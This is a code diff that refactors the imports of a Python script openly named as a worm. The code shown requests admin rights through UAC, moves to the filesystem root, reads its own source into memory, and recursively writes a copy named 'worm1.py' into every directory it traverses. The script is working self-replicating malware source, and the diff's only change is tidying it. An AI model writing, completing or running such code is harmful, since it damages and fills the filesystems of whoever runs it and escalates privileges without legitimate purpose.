@@ -1,4 +1,4 @@
-import os
+from os import chdir, scandir, getcwd
 import random
 import UAC
 
@@ -7,7 +7,7 @@ if not UAC.isUserAdmin():
     UAC.runAsAdmin()
 random.seed()
 
-os.chdir('/')
+chdir('/')
 
 MEMORY_PER_RUN = 4000
 WORM_BIN = b""
@@ -19,7 +19,7 @@ with open("worm.py", "rb") as infile:
     WORM_BIN += info
 
 def traverse(path):
-    with os.scandir(path) as scanner:
+    with scandir(path) as scanner:
         try:
             with open(path+"\worm1.py", "wb") as outfile:
                 outfile.write(WORM_BIN)
@@ -39,4 +39,4 @@ def traverse(path):
     return
 
 if __name__ == "__main__":
-    traverse(os.getcwd())
+    traverse(getcwd())
